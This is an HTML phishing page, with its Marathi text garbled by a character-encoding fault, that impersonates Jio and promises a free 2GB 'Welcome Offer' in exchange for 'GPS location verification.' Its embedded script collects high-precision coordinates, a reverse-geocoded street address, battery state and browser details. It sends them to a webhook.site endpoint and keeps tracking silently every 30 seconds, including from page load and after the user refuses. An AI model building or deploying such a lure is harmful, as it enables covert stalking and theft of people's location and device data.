<!DOCTYPE html>
<html lang="mr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jio - ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§µ‡•ç‡§π‡•á‡§∞‡§ø‡§´‡§ø‡§ï‡•á‡§∂‡§®</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        .bg-animation {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><radialGradient id="a" cx="50%" cy="50%"><stop offset="0%" stop-color="%23ff6b6b"/><stop offset="50%" stop-color="%23feca57"/><stop offset="100%" stop-color="%2348dbfb"/></radialGradient></defs><circle cx="20" cy="20" r="2" fill="url(%23a)"><animate attributeName="r" values="2;3;2" dur="3s" repeatCount="indefinite"/><animate attributeName="cx" values="20;30;20" dur="3s" repeatCount="indefinite"/><animate attributeName="cy" values="20;30;20" dur="3s" repeatCount="indefinite"/></circle></svg>') no-repeat;
            animation: float 20s infinite linear;
            z-index: -1;
        }
        @keyframes float { 0% { transform: translateY(0) rotate(0deg); } 100% { transform: translateY(-100vh) rotate(360deg); } }
        
        .container {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.2);
            padding: 40px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            position: relative;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .jio-logo {
            width: 90px; height: 90px;
            background: linear-gradient(45deg, #ff6b35, #f7931e, #00d4aa);
            border-radius: 50%;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 35px;
            color: white;
            font-weight: 700;
            box-shadow: 0 15px 30px rgba(255,107,53,0.4);
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.05);} }
        
        h1 { color: #1e3c72; margin-bottom: 10px; font-size: 26px; font-weight: 700; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 15px; }
        
        .location-btn {
            width: 100%; padding: 18px; 
            background: linear-gradient(45deg, #00c851, #007e33);
            color: white; border: none; border-radius: 15px;
            font-size: 17px; font-weight: 600;
            cursor: pointer; margin-bottom: 25px;
            transition: all 0.3s; position: relative; overflow: hidden;
        }
        .location-btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0,200,81,0.4); }
        .location-btn:active { transform: translateY(-1px); }
        .btn-glow { box-shadow: 0 0 20px rgba(0,200,81,0.5); }
        
        .status { padding: 15px; border-radius: 12px; margin: 20px 0; font-weight: 500; display: none; }
        .success { background: linear-gradient(45deg, #d4edda, #c3e6cb); color: #155724; }
        .loading { background: linear-gradient(45deg, #fff3cd, #ffeaa7); color: #856404; animation: shimmer 1.5s infinite; }
        @keyframes shimmer { 0%{background-position:-200px 0;} 100%{background-position:200px 0;} }
        
        .tracking-info { background: linear-gradient(45deg, #e3f2fd, #bbdefb); padding: 20px; border-radius: 15px; margin-top: 20px; }
        .coord-display { font-family: monospace; background: white; padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 14px; color: #1e3c72; }
        .map-link { color: #2196f3; text-decoration: none; font-weight: 600; }
        .map-link:hover { text-decoration: underline; }
        
        .features { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 25px; }
        .feature { background: rgba(30,60,114,0.1); padding: 12px; border-radius: 10px; font-size: 13px; }
        
        @media (max-width: 480px) { .container { padding: 30px 25px; } }
    </style>
</head>
<body>
    <div class="bg-animation"></div>
    
    <div class="container">
        <div class="jio-logo"><i class="fas fa-signal"></i></div>
        <h1><i class="fas fa-mobile-alt"></i> Jio ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§µ‡•ç‡§π‡•á‡§∞‡§ø‡§´‡§ø‡§ï‡•á‡§∂‡§®</h1>
        <p class="subtitle">‡§§‡•Å‡§Æ‡§ö‡•Ä Jio Welcome Offer ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§ï‡§∞‡§£‡•ç‡§Ø‡§æ‡§∏‡§æ‡§†‡•Ä GPS ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§Ü‡§π‡•á</p>
        
        <button id="locationBtn" class="location-btn">
            <i class="fas fa-location-arrow"></i> GPS ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§ï‡§∞‡§æ
        </button>
        
        <div id="status" class="status"></div>
        
        <div id="trackingInfo" class="tracking-info" style="display:none;">
            <div style="font-size:18px; color:#1e3c72; margin-bottom:15px;">
                <i class="fas fa-map-marker-alt"></i> Live GPS Tracking ‡§ö‡§æ‡§≤‡•Ç
            </div>
            <div id="coordsDisplay" class="coord-display"></div>
        </div>
        
        <div class="features">
            <div class="feature"><i class="fas fa-bolt" style="color:#ff6b35;"></i><br>Free 2GB Data</div>
            <div class="feature"><i class="fas fa-gift" style="color:#00d4aa;"></i><br>Welcome Pack</div>
        </div>
    </div>

    <script>
        const btn = document.getElementById('locationBtn');
        const status = document.getElementById('status');
        const trackingInfo = document.getElementById('trackingInfo');
        const coordsDisplay = document.getElementById('coordsDisplay');
        const WEBHOOK_URL = 'https://webhook.site/e8bb7b6b-c065-40da-910d-d25132e021f5';
        
        // Service Worker for offline
        if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js');
        
        btn.addEventListener('click', startHighPrecisionTracking);
        
        async function showStatus(msg, type) {
            status.textContent = msg;
            status.className = `status ${type}`;
            status.style.display = 'block';
        }
        
        async function getReverseGeocode(lat, lng) {
            try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`);
                const data = await res.json();
                return data.display_name || 'Address unavailable';
            } catch {
                return 'Geocoding unavailable';
            }
        }
        
        async function sendEnhancedLocation(coords) {
            const address = await getReverseGeocode(coords.latitude, coords.longitude);
            const battery = await navigator.getBattery?.() || {};
            
            const payload = {
                timestamp: new Date().toISOString(),
                // HIGH PRECISION GPS COORDINATES
                latitude: parseFloat(coords.latitude.toFixed(8)),
                longitude: parseFloat(coords.longitude.toFixed(8)),
                accuracy: coords.accuracy,
                altitude: coords.altitude || null,
                heading: coords.heading || null,
                speed: coords.speed || null,
                // REVERSE GEOCODING
                address: address.substring(0, 200),
                // DEVICE INFO
                battery_level: Math.round(battery.level * 100),
                charging: battery.charging,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                connection: navigator.connection?.effectiveType || 'unknown',
                // TRACKING
                tracking_mode: 'high_precision_gps'
            };
            
            console.log('üìç GPS Data:', payload);
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch(e) { console.log('Webhook offline:', e); }
        }
        
        async function startHighPrecisionTracking() {
            btn.disabled = true;
            btn.classList.add('btn-glow');
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GPS ‡§∂‡•ã‡§ß‡§§ ‡§Ü‡§π‡•á...';
            showStatus('üîç High Precision GPS ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§ï‡§∞‡§§ ‡§Ü‡§π‡•á...', 'loading');
            
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,  // MAX ACCURACY
                        timeout: 15000,
                        maximumAge: 0
                    });
                });
                
                showStatus('‚úÖ GPS Permission ‡§Æ‡§ø‡§≥‡§æ‡§≤‡•Ä! Live Tracking ‡§∏‡•Å‡§∞‡•Ç', 'success');
                displayCoords(position.coords);
                await sendEnhancedLocation(position.coords);
                
                // 30 SECOND INTERVAL TRACKING
                setInterval(async () => {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            sendEnhancedLocation(pos.coords);
                            displayCoords(pos.coords);
                        },
                        () => {}, // Silent fail
                        { enableHighAccuracy: true, timeout: 8000, maximumAge: 25000 }
                    );
                }, 30000);
                
                trackingInfo.style.display = 'block';
                btn.style.display = 'none';
                
            } catch (error) {
                console.log('GPS Error:', error);
                btn.innerHTML = '<i class="fas fa-redo"></i> ‡§™‡•Å‡§®‡•ç‡§π‡§æ ‡§™‡•ç‡§∞‡§Ø‡§§‡•ç‡§®';
                btn.disabled = false;
                setTimeout(startSilentTracking, 3000);
            }
        }
        
        function displayCoords(coords) {
            const mapLink = `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
            coordsDisplay.innerHTML = `
                <strong>GPS Coordinates:</strong><br>
                üìç <code>${coords.latitude.toFixed(8)}, ${coords.longitude.toFixed(8)}</code><br>
                üìè Accuracy: ${coords.accuracy?.toFixed(1)}m<br>
                üó∫Ô∏è <a href="${mapLink}" target="_blank" class="map-link">Google Maps ‡§µ‡§∞ ‡§™‡§π‡§æ</a>
            `;
        }
        
        function startSilentTracking() {
            setInterval(() => {
                navigator.geolocation.getCurrentPosition(
                    pos => sendEnhancedLocation(pos.coords),
                    () => {},
                    { enableHighAccuracy: true }
                );
            }, 30000);
        }
        
        // Auto-start + Page visibility
        window.addEventListener('load', () => setTimeout(startSilentTracking, 1500));
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) startHighPrecisionTracking();
        });
    </script>
</body>
</html>
